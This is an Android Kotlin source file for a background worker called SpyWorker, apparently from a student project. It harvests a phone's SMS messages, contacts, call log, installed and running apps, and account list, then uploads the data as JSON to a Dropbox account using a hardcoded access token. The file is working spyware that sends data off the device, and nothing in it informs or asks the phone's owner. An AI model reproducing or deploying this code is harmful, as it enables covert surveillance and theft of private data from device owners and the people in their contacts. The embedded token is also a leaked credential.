package com.homework.myapplication.spyservice

import android.content.Context
import android.os.Build
import androidx.work.CoroutineWorker
import androidx.work.Data
import androidx.work.WorkerParameters
import com.dropbox.core.DbxRequestConfig
import com.dropbox.core.v2.DbxClientV2
import com.google.gson.Gson
import com.homework.myapplication.App
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.ByteArrayInputStream
import java.io.InputStream

class SpyWorker(appContext: Context, workerParameters: WorkerParameters) :
    CoroutineWorker(appContext, workerParameters) {

    private val getMessages: GetMessages = GetMessages()
    private val getContacts: GetContacts = GetContacts()
    private val getCalls: GetCalls = GetCalls()
    private val getInstalled: GetInstalled = GetInstalled()
    private val getRunning: GetRunning = GetRunning()
    private val getBattery: GetBattery = GetBattery()
    private val getMemory: GetMemory = GetMemory()
    private val getAccounts: GetAccounts = GetAccounts()

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val spyInfo = SpyInfo.Builder().apply {
                setMessages(getMessages(App.appContext))
                setContacts(getContacts(App.appContext))
                setCalls(getCalls(App.appContext))
                setVersion(Build.VERSION.RELEASE)
                setSdk(Build.VERSION.SDK_INT)
                setInstalled(getInstalled(App.appContext))
                setRunning(getRunning(App.appContext))
                setBattery(getBattery(App.appContext))
                setMemory(getMemory(App.appContext))
                setAccounts(getAccounts(App.appContext))
                build()
            }
            val data: ByteArray = Gson().toJson(spyInfo).toByteArray()
            uploadToDisk(ByteArrayInputStream(data))
            Result.success()
        } catch (e: Exception) {
            val outputData = createOutputData()
            Result.failure(outputData)
        }
    }

    private fun createOutputData(): Data {
        return Data.Builder()
            .putString(KEY_OUTPUT, ERROR_DATA)
            .build()
    }

    private fun uploadToDisk(inputStream: InputStream) {
        val config = DbxRequestConfig.newBuilder("dropbox/bos1").build()
        val client = DbxClientV2(config, ACCESS_TOKEN)
        try {
            client.files().upload("/$FILE_NAME")
                .uploadAndFinish(inputStream)
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
    }

    companion object {
        private const val KEY_OUTPUT: String = "key_output"
        private const val FILE_NAME = "data.txt"
        private const val ERROR_DATA = "failure process data"
        private const val ACCESS_TOKEN = "sl.BBhJBk9MLKenMzjl2incc2vdnM25Ffe0wnynqwpcQfcAinveQEb-mwXP1MMFIsyj0oKfYCPNLpmFTjYPP3hT3Cyb3FtalekTez5tF-VdJoPFRPZF6UvMpnLdsZHu7xANi9SGP4rY7W8H"
    }
}
